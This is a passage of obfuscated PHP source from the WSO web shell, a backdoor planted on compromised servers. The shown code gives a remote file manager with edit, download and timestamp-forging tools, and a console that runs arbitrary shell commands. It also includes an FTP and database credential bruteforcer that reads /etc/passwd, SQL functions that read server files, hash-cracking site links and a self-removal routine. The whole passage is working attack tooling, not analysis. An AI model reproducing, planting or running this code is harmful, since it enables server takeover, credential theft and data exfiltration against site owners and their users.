    <table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
    <form name=files method=post><tr><th width=\'13px\'><input type=checkbox onclick=\'sa()\' class=chkbx></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_name_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Name</a></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_size_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Size</a></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_modify_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Modify</a></th><th>Owner/Group</th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_perms_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Permissions</a></th><th>Actions</th></tr>'; $sp495c2d = $spf2bff7 = array(); $sp5c3411 = count($spea6e47); for ($sp412bbc = 0; $sp412bbc < $sp5c3411; $sp412bbc++) { $spdc02c3 = @posix_getpwuid(@fileowner($spea6e47[$sp412bbc])); $spd8ebab = @posix_getgrgid(@filegroup($spea6e47[$sp412bbc])); $sp5a7cd5 = array('name' => $spea6e47[$sp412bbc], 'path' => $sp2eb6c3['cwd'] . $spea6e47[$sp412bbc], 'modify' => date('Y-m-d H:i:s', @filemtime($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])), 'perms' => wsoPermsColor($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc]), 'size' => @filesize($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc]), 'owner' => $spdc02c3['name'] ? $spdc02c3['name'] : @fileowner($spea6e47[$sp412bbc]), 'group' => $spd8ebab['name'] ? $spd8ebab['name'] : @filegroup($spea6e47[$sp412bbc])); if (@is_file($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])) { $spf2bff7[] = array_merge($sp5a7cd5, array('type' => 'file')); } elseif (@is_link($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])) { $sp495c2d[] = array_merge($sp5a7cd5, array('type' => 'link', 'link' => readlink($sp5a7cd5['path']))); } elseif (@is_dir($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])) { $sp495c2d[] = array_merge($sp5a7cd5, array('type' => 'dir')); } } $sp2eb6c3['sort'] = $spbc4c0f; function wsoCmp($spd09f64, $sp20e3ac) { if ($sp2eb6c3['sort'][0] != 'size') { return strcmp(strtolower($spd09f64[$sp2eb6c3['sort'][0]]), strtolower($sp20e3ac[$sp2eb6c3['sort'][0]])) * ($sp2eb6c3['sort'][1] ? 1 : -1); } else { return ($spd09f64['size'] < $sp20e3ac['size'] ? -1 : 1) * ($sp2eb6c3['sort'][1] ? 1 : -1); } } usort($spf2bff7, 'wsoCmp'); usort($sp495c2d, 'wsoCmp'); $spf2bff7 = array_merge($sp495c2d, $spf2bff7); $sp881e9f = 0; foreach ($spf2bff7 as $sp1b2b3c) { echo '<tr' . ($sp881e9f ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($sp1b2b3c['name']) . '" class=chkbx></td><td><a href=# onclick="' . ($sp1b2b3c['type'] == 'file' ? 'g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'view\')">' . htmlspecialchars($sp1b2b3c['name']) : 'g(\'FilesMan\',\'' . $sp1b2b3c['path'] . '\');" ' . (empty($sp1b2b3c['link']) ? '' : "title='{$sp1b2b3c['link']}'") . '><b>[ ' . htmlspecialchars($sp1b2b3c['name']) . ' ]</b>') . '</a></td><td>' . ($sp1b2b3c['type'] == 'file' ? wsoViewSize($sp1b2b3c['size']) : $sp1b2b3c['type']) . '</td><td>' . $sp1b2b3c['modify'] . '</td><td>' . $sp1b2b3c['owner'] . '/' . $sp1b2b3c['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\',\'chmod\')">' . $sp1b2b3c['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'touch\')">T</a>' . ($sp1b2b3c['type'] == 'file' ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>'; $sp881e9f = $sp881e9f ? 0 : 1; } echo '<tr><td colspan=7>
    	<input type=hidden name=a value=\'FilesMan\'>
    	<input type=hidden name=c value=\'' . htmlspecialchars($sp2eb6c3['cwd']) . '\'>
    	<input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '\'>
    	<select name=\'p1\'><option value=\'copy\'>Copy</option><option value=\'move\'>Move</option><option value=\'delete\'>Delete</option>'; if (class_exists('ZipArchive')) { echo '<option value=\'zip\'>Compress (zip)</option><option value=\'unzip\'>Uncompress (zip)</option>'; } echo '<option value=\'tar\'>Compress (tar.gz)</option>'; if (!empty($_COOKIE['act']) && @count($_COOKIE['f'])) { echo '<option value=\'paste\'>Paste / Compress</option>'; } echo '</select>&nbsp;'; if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && ($_COOKIE['act'] == 'zip' || $_COOKIE['act'] == 'tar')) { echo 'file name: <input type=text name=p2 value=\'wso_' . date('Ymd_His') . '.' . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . '\'>&nbsp;'; } echo '<input type=\'submit\' value=\'>>\'></td></tr></form></table></div>'; wsoFooter(); } function actionStringTools() { if (!function_exists('hex2bin')) { function hex2bin($spba2fc0) { return decbin(hexdec($spba2fc0)); } } if (!function_exists('binhex')) { function binhex($spba2fc0) { return dechex(bindec($spba2fc0)); } } if (!function_exists('hex2ascii')) { function hex2ascii($spba2fc0) { $sp305b9c = ''; for ($sp412bbc = 0; $sp412bbc < strLen($spba2fc0); $sp412bbc += 2) { $sp305b9c .= chr(hexdec($spba2fc0[$sp412bbc] . $spba2fc0[$sp412bbc + 1])); } return $sp305b9c; } } if (!function_exists('ascii2hex')) { function ascii2hex($spba2fc0) { $sp305b9c = ''; for ($sp412bbc = 0; $sp412bbc < strlen($spba2fc0); ++$sp412bbc) { $sp305b9c .= sprintf('%02X', ord($spba2fc0[$sp412bbc])); } return strtoupper($sp305b9c); } } if (!function_exists('full_urlencode')) { function full_urlencode($spba2fc0) { $sp305b9c = ''; for ($sp412bbc = 0; $sp412bbc < strlen($spba2fc0); ++$sp412bbc) { $sp305b9c .= '%' . dechex(ord($spba2fc0[$sp412bbc])); } return strtoupper($sp305b9c); } } $spb41176 = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen'); if (isset($_POST['ajax'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true); ob_start(); if (in_array($_POST['p1'], $spb41176)) { echo $_POST['p1']($_POST['p2']); } $spc44fb2 = 'document.getElementById(\'strOutput\').style.display=\'\';document.getElementById(\'strOutput\').innerHTML=\'' . addcslashes(htmlspecialchars(ob_get_clean()), '
	\\\' ') . '\';
'; echo strlen($spc44fb2), '
', $spc44fb2; die; } if (empty($_POST['ajax']) && !empty($_POST['p1'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0); } wsoHeader(); echo '<h1>String conversions</h1><div class=content>'; echo '<form name=\'toolsForm\' onSubmit=\'if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;\'><select name=\'selectTool\'>'; foreach ($spb41176 as $sp8db113 => $sp6d4391) { echo '<option value=\'' . htmlspecialchars($sp6d4391) . '\'>' . $sp8db113 . '</option>'; } echo '</select><input type=\'submit\' value=\'>>\'/> <input type=checkbox name=ajax value=1 ' . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX<br><textarea name=\'input\' style=\'margin-top:5px\' class=bigarea>' . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . '</textarea></form><pre class=\'ml1\' style=\'' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px\' id=\'strOutput\'>'; if (!empty($_POST['p1'])) { if (in_array($_POST['p1'], $spb41176)) { echo htmlspecialchars($_POST['p1']($_POST['p2'])); } } echo '</pre></div><br><h1>Search files:</h1><div class=content>
    		<form onsubmit="g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;"><table cellpadding=\'1\' cellspacing=\'0\' width=\'50%\'>
    			<tr><td width=\'1%\'>Text:</td><td><input type=\'text\' name=\'text\' style=\'width:100%\'></td></tr>
    			<tr><td>Path:</td><td><input type=\'text\' name=\'cwd\' value=\'' . htmlspecialchars($sp2eb6c3['cwd']) . '\' style=\'width:100%\'></td></tr>
    			<tr><td>Name:</td><td><input type=\'text\' name=\'filename\' value=\'*\' style=\'width:100%\'></td></tr>
    			<tr><td></td><td><input type=\'submit\' value=\'>>\'></td></tr>
    			</table></form>'; function wsoRecursiveGlob($sp149c6d) { if (substr($sp149c6d, -1) != '/') { $sp149c6d .= '/'; } $sp9d1e45 = @array_unique(@array_merge(@glob($sp149c6d . $_POST['p3']), @glob($sp149c6d . '*', GLOB_ONLYDIR))); if (is_array($sp9d1e45) && @count($sp9d1e45)) { foreach ($sp9d1e45 as $sp527681) { if (@is_dir($sp527681)) { if ($sp149c6d != $sp527681) { wsoRecursiveGlob($sp527681); } } else { if (empty($_POST['p2']) || @strpos(file_get_contents($sp527681), $_POST['p2']) !== false) { echo '<a href=\'#\' onclick=\'g("FilesTools",null,"' . urlencode($sp527681) . '", "view","")\'>' . htmlspecialchars($sp527681) . '</a><br>'; } } } } } if (@$_POST['p3']) { wsoRecursiveGlob($_POST['c']); } echo '</div><br><h1>Search for hash:</h1><div class=content>
    		<form method=\'post\' target=\'_blank\' name=\'hf\'>
    			<input type=\'text\' name=\'hash\' style=\'width:200px;\'><br>
                <input type=\'hidden\' name=\'act\' value=\'find\'/>
    			<input type=\'button\' value=\'hashcracking.ru\' onclick="document.hf.action=\'https://hashcracking.ru/index.php\';document.hf.submit()"><br>
    			<input type=\'button\' value=\'md5.rednoize.com\' onclick="document.hf.action=\'http://md5.rednoize.com/?q=\'+document.hf.hash.value+\'&s=md5\';document.hf.submit()"><br>
                <input type=\'button\' value=\'crackfor.me\' onclick="document.hf.action=\'http://crackfor.me/index.php\';document.hf.submit()"><br>
    		</form></div>'; wsoFooter(); } function actionFilesTools() { if (isset($_POST['p1'])) { $_POST['p1'] = urldecode($_POST['p1']); } if (@$_POST['p2'] == 'download') { if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) { ob_start('ob_gzhandler', 4096); header('Content-Disposition: attachment; filename=' . basename($_POST['p1'])); if (function_exists('mime_content_type')) { $spa48979 = @mime_content_type($_POST['p1']); header('Content-Type: ' . $spa48979); } else { header('Content-Type: application/octet-stream'); } $spe0ea16 = @fopen($_POST['p1'], 'r'); if ($spe0ea16) { while (!@feof($spe0ea16)) { echo @fread($spe0ea16, 1024); } fclose($spe0ea16); } } die; } if (@$_POST['p2'] == 'mkfile') { if (!file_exists($_POST['p1'])) { $spe0ea16 = @fopen($_POST['p1'], 'w'); if ($spe0ea16) { $_POST['p2'] = 'edit'; fclose($spe0ea16); } } } wsoHeader(); echo '<h1>File tools</h1><div class=content>'; if (!file_exists(@$_POST['p1'])) { echo 'File not exists'; wsoFooter(); return; } $sped417e = @posix_getpwuid(@fileowner($_POST['p1'])); if (!$sped417e) { $sped417e['name'] = @fileowner($_POST['p1']); $spe9607f['name'] = @filegroup($_POST['p1']); } else { $spe9607f = @posix_getgrgid(@filegroup($_POST['p1'])); } echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . wsoPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $sped417e['name'] . '/' . $spe9607f['name'] . '<br>'; echo '<span>Change time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>'; if (empty($_POST['p2'])) { $_POST['p2'] = 'view'; } if (is_file($_POST['p1'])) { $sp8374c6 = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); } else { $sp8374c6 = array('Chmod', 'Rename', 'Touch'); } foreach ($sp8374c6 as $sp6d4391) { echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($sp6d4391) . '\')">' . (strtolower($sp6d4391) == @$_POST['p2'] ? '<b>[ ' . $sp6d4391 . ' ]</b>' : $sp6d4391) . '</a> '; } echo '<br><br>'; switch ($_POST['p2']) { case 'view': echo '<pre class=ml1>'; $spe0ea16 = @fopen($_POST['p1'], 'r'); if ($spe0ea16) { while (!@feof($spe0ea16)) { echo htmlspecialchars(@fread($spe0ea16, 1024)); } @fclose($spe0ea16); } echo '</pre>'; break; case 'highlight': if (@is_readable($_POST['p1'])) { echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">'; $sp44ea35 = @highlight_file($_POST['p1'], true); echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $sp44ea35) . '</div>'; } break; case 'chmod': if (!empty($_POST['p3'])) { $spce0b8c = 0; for ($sp412bbc = strlen($_POST['p3']) - 1; $sp412bbc >= 0; --$sp412bbc) { $spce0b8c += (int) $_POST['p3'][$sp412bbc] * pow(8, strlen($_POST['p3']) - $sp412bbc - 1); } if (!@chmod($_POST['p1'], $spce0b8c)) { echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>'; } } clearstatcache(); echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>'; break; case 'edit': if (!is_writable($_POST['p1'])) { echo 'File isn\'t writeable'; break; } if (!empty($_POST['p3'])) { $spb8a5bd = @filemtime($_POST['p1']); $_POST['p3'] = substr($_POST['p3'], 1); $spe0ea16 = @fopen($_POST['p1'], 'w'); if ($spe0ea16) { @fwrite($spe0ea16, $_POST['p3']); @fclose($spe0ea16); echo 'Saved!<br><script>p3_="";</script>'; @touch($_POST['p1'], $spb8a5bd, $spb8a5bd); } } echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>'; $spe0ea16 = @fopen($_POST['p1'], 'r'); if ($spe0ea16) { while (!@feof($spe0ea16)) { echo htmlspecialchars(@fread($spe0ea16, 1024)); } @fclose($spe0ea16); } echo '</textarea><input type=submit value=">>"></form>'; break; case 'hexdump': $sp559d1c = @file_get_contents($_POST['p1']); $sp5c3411 = 0; $sp4a7259 = array('00000000<br>', '', ''); $sp100126 = strlen($sp559d1c); for ($sp412bbc = 0; $sp412bbc < $sp100126; ++$sp412bbc) { $sp4a7259[1] .= sprintf('%02X', ord($sp559d1c[$sp412bbc])) . ' '; switch (ord($sp559d1c[$sp412bbc])) { case 0: $sp4a7259[2] .= ' '; break; case 9: $sp4a7259[2] .= ' '; break; case 10: $sp4a7259[2] .= ' '; break; case 13: $sp4a7259[2] .= ' '; break; default: $sp4a7259[2] .= $sp559d1c[$sp412bbc]; break; } $sp5c3411++; if ($sp5c3411 == 32) { $sp5c3411 = 0; if ($sp412bbc + 1 < $sp100126) { $sp4a7259[0] .= sprintf('%08X', $sp412bbc + 1) . '<br>'; } $sp4a7259[1] .= '<br>'; $sp4a7259[2] .= '
'; } } echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $sp4a7259[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $sp4a7259[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($sp4a7259[2]) . '</pre></td></tr></table>'; break; case 'rename': if (!empty($_POST['p3'])) { if (!@rename($_POST['p1'], $_POST['p3'])) { echo 'Can\'t rename!<br>'; } else { die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>'); } } echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>'; break; case 'touch': if (!empty($_POST['p3'])) { $spb8a5bd = strtotime($_POST['p3']); if ($spb8a5bd) { if (!touch($_POST['p1'], $spb8a5bd, $spb8a5bd)) { echo 'Fail!'; } else { echo 'Touched!'; } } else { echo 'Bad time format!'; } } clearstatcache(); echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="' . date('Y-m-d H:i:s', @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>'; break; } echo '</div>'; wsoFooter(); } function actionConsole() { if (!empty($_POST['p1']) && !empty($_POST['p2'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true); $_POST['p1'] .= ' 2>&1'; } elseif (!empty($_POST['p1'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', 0); } if (isset($_POST['ajax'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true); ob_start(); echo 'd.cf.cmd.value=\'\';
'; $spc44fb2 = @iconv($_POST['charset'], 'UTF-8', addcslashes('
$ ' . $_POST['p1'] . '
' . wsoEx($_POST['p1']), '
	\\\' ')); if (preg_match('!.*cd\\s+([^;]+)$!', $_POST['p1'], $spd3b0e2)) { if (@chdir($spd3b0e2[1])) { $sp2eb6c3['cwd'] = @getcwd(); echo 'c_=\'' . $sp2eb6c3['cwd'] . '\';'; } } echo 'd.cf.output.value+=\'' . $spc44fb2 . '\';'; echo 'd.cf.output.scrollTop = d.cf.output.scrollHeight;'; $spc44fb2 = ob_get_clean(); echo strlen($spc44fb2), '
', $spc44fb2; die; } if (empty($_POST['ajax']) && !empty($_POST['p1'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0); } wsoHeader(); echo '<script>
    if(window.Event) window.captureEvents(Event.KEYDOWN);
    var cmds = new Array(\'\');
    var cur = 0;
    function kp(e) {
    	var n = (window.Event) ? e.which : e.keyCode;
    	if(n == 38) {
    		cur--;
    		if(cur>=0)
    			document.cf.cmd.value = cmds[cur];
    		else
    			cur++;
    	} else if(n == 40) {
    		cur++;
    		if(cur < cmds.length)
    			document.cf.cmd.value = cmds[cur];
    		else
    			cur--;
    	}
    }
    function add(cmd) {
    	cmds.pop();
    	cmds.push(cmd);
    	cmds.push(\'\');
    	cur = cmds.length-1;
    }
    </script>'; echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>'; foreach ($sp2eb6c3['aliases'] as $sp5c3411 => $sp6d4391) { if ($sp6d4391 == '') { echo '<optgroup label="-' . htmlspecialchars($sp5c3411) . '-"></optgroup>'; continue; } echo '<option value="' . htmlspecialchars($sp6d4391) . '">' . $sp5c3411 . '</option>'; } echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 ' . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX <input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>'; if (!empty($_POST['p1'])) { echo htmlspecialchars('$ ' . $_POST['p1'] . '
' . wsoEx($_POST['p1'])); } echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>'; echo '</form></div><script>d.cf.cmd.focus();</script>'; wsoFooter(); } function actionLogout() { setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600); die('bye!'); } function actionSelfRemove() { if ($_POST['p1'] == 'yes') { if (@unlink(preg_replace('!\\(\\d+\\)\\s.*!', '', __FILE__))) { die('Shell has been removed'); } else { echo 'unlink error!'; } } if ($_POST['p1'] != 'yes') { wsoHeader(); } echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>'; wsoFooter(); } function actionBruteforce() { wsoHeader(); if (isset($_POST['proto'])) { echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>'; if ($_POST['proto'] == 'ftp') { function wsoBruteForce($spbfd0cf, $sp83248d, $sp32a8cc, $sp7ceca3) { $spe0ea16 = @ftp_connect($spbfd0cf, $sp83248d ? $sp83248d : 21); if (!$spe0ea16) { return false; } $sp8e5eb2 = @ftp_login($spe0ea16, $sp32a8cc, $sp7ceca3); @ftp_close($spe0ea16); return $sp8e5eb2; } } elseif ($_POST['proto'] == 'mysql') { function wsoBruteForce($spbfd0cf, $sp83248d, $sp32a8cc, $sp7ceca3) { $sp8e5eb2 = @mysql_connect($spbfd0cf . ':' . ($sp83248d ? $sp83248d : 3306), $sp32a8cc, $sp7ceca3); @mysql_close($sp8e5eb2); return $sp8e5eb2; } } elseif ($_POST['proto'] == 'pgsql') { function wsoBruteForce($spbfd0cf, $sp83248d, $sp32a8cc, $sp7ceca3) { $sp1ae2ba = 'host=\'' . $spbfd0cf . '\' port=\'' . $sp83248d . '\' user=\'' . $sp32a8cc . '\' password=\'' . $sp7ceca3 . '\' dbname=postgres'; $sp8e5eb2 = @pg_connect($sp1ae2ba); @pg_close($sp8e5eb2); return $sp8e5eb2; } } $sp2ff3c8 = 0; $spcf7ac0 = 0; $spddf521 = explode(':', $_POST['server']); if ($_POST['type'] == 1) { $spc44fb2 = @file('/etc/passwd'); if (is_array($spc44fb2)) { foreach ($spc44fb2 as $sp47b792) { $sp47b792 = explode(':', $sp47b792); ++$spcf7ac0; if (wsoBruteForce(@$spddf521[0], @$spddf521[1], $sp47b792[0], $sp47b792[0])) { $sp2ff3c8++; echo '<b>' . htmlspecialchars($sp47b792[0]) . '</b>:' . htmlspecialchars($sp47b792[0]) . '<br>'; } if (@$_POST['reverse']) { $sp5a7cd5 = ''; for ($sp412bbc = strlen($sp47b792[0]) - 1; $sp412bbc >= 0; --$sp412bbc) { $sp5a7cd5 .= $sp47b792[0][$sp412bbc]; } ++$spcf7ac0; if (wsoBruteForce(@$spddf521[0], @$spddf521[1], $sp47b792[0], $sp5a7cd5)) { $sp2ff3c8++; echo '<b>' . htmlspecialchars($sp47b792[0]) . '</b>:' . htmlspecialchars($sp5a7cd5); } } } } } elseif ($_POST['type'] == 2) { $spc44fb2 = @file($_POST['dict']); if (is_array($spc44fb2)) { foreach ($spc44fb2 as $sp47b792) { $sp47b792 = trim($sp47b792); ++$spcf7ac0; if (wsoBruteForce($spddf521[0], @$spddf521[1], $_POST['login'], $sp47b792)) { $sp2ff3c8++; echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($sp47b792) . '<br>'; } } } } echo "<span>Attempts:</span> {$spcf7ac0} <span>Success:</span> {$sp2ff3c8}</div><br>"; } echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($sp2eb6c3['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($sp2eb6c3['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>'; echo '</div><br>'; wsoFooter(); } function actionSql() { class DbClass { var $type; var $link; var $res; function DbClass($spa48979) { $this->type = $spa48979; } function connect($sp06f4c3, $sp8b0777, $sp7ceca3, $sp50c961) { switch ($this->type) { case 'mysql': if ($this->link = @mysql_connect($sp06f4c3, $sp8b0777, $sp7ceca3, true)) { return true; } break; case 'pgsql': $sp06f4c3 = explode(':', $sp06f4c3); if (!$sp06f4c3[1]) { $sp06f4c3[1] = 5432; } if ($this->link = @pg_connect("host={$sp06f4c3[0]} port={$sp06f4c3[1]} user={$sp8b0777} password={$sp7ceca3} dbname={$sp50c961}")) { return true; } break; } return false; } function selectdb($sp95ae53) { switch ($this->type) { case 'mysql': if (@mysql_select_db($sp95ae53)) { return true; } break; } return false; } function query($sp1ae2ba) { switch ($this->type) { case 'mysql': return $this->res = @mysql_query($sp1ae2ba); break; case 'pgsql': return $this->res = @pg_query($this->link, $sp1ae2ba); break; } return false; } function fetch() { $sp8e5eb2 = func_num_args() ? func_get_arg(0) : $this->res; switch ($this->type) { case 'mysql': return @mysql_fetch_assoc($sp8e5eb2); break; case 'pgsql': return @pg_fetch_assoc($sp8e5eb2); break; } return false; } function listDbs() { switch ($this->type) { case 'mysql': return $this->query('SHOW databases'); break; case 'pgsql': return $this->res = $this->query('SELECT datname FROM pg_database WHERE datistemplate!=\'t\''); break; } return false; } function listTables() { switch ($this->type) { case 'mysql': return $this->res = $this->query('SHOW TABLES'); break; case 'pgsql': return $this->res = $this->query('select table_name from information_schema.tables where table_schema != \'information_schema\' AND table_schema != \'pg_catalog\''); break; } return false; } function error() { switch ($this->type) { case 'mysql': return @mysql_error(); break; case 'pgsql': return @pg_last_error(); break; } return false; } function setCharset($sp1ae2ba) { switch ($this->type) { case 'mysql': if (function_exists('mysql_set_charset')) { return @mysql_set_charset($sp1ae2ba, $this->link); } else { $this->query('SET CHARSET ' . $sp1ae2ba); } break; case 'pgsql': return @pg_set_client_encoding($this->link, $sp1ae2ba); break; } return false; } function loadFile($sp1ae2ba) { switch ($this->type) { case 'mysql': return $this->fetch($this->query('SELECT LOAD_FILE(\'' . addslashes($sp1ae2ba) . '\') as file')); break; case 'pgsql': $this->query('CREATE TABLE wso2(file text);COPY wso2 FROM \'' . addslashes($sp1ae2ba) . '\';select file from wso2;'); $sp305b9c = array(); while ($sp412bbc = $this->fetch()) { $sp305b9c[] = $sp412bbc['file']; } $this->query('drop table wso2'); return array('file' => implode('
', $sp305b9c)); break; } return false; } function dump($sp110772, $spe0ea16 = false) { switch ($this->type) { case 'mysql': $sp8e5eb2 = $this->query('SHOW CREATE TABLE `' . $sp110772 . '`'); $spe8e7e2 = mysql_fetch_array($sp8e5eb2); $sp2f57d0 = $spe8e7e2[1] . ';
'; if ($spe0ea16) { fwrite($spe0ea16, $sp2f57d0); } else { echo $sp2f57d0; } $this->query('SELECT * FROM `' . $sp110772 . '`'); $sp412bbc = 0; $sp812f81 = true; while ($sp527681 = $this->fetch()) { $sp2f57d0 = ''; if ($sp412bbc % 1000 == 0) { $sp812f81 = true; $sp2f57d0 = ';

'; } $spba3e65 = array(); foreach ($sp527681 as $sp8db113 => $sp6d4391) { if ($sp6d4391 === null) { $sp527681[$sp8db113] = 'NULL'; } elseif (is_int($sp6d4391)) { $sp527681[$sp8db113] = $sp6d4391; } else { $sp527681[$sp8db113] = '\'' . @mysql_real_escape_string($sp6d4391) . '\''; } $spba3e65[] = '`' . $sp8db113 . '`'; } if ($sp812f81) { $sp2f57d0 .= 'INSERT INTO `' . $sp110772 . '` (' . implode(', ', $spba3e65) . ') VALUES 
	(' . implode(', ', $sp527681) . ')'; $sp812f81 = false; } else { $sp2f57d0 .= '
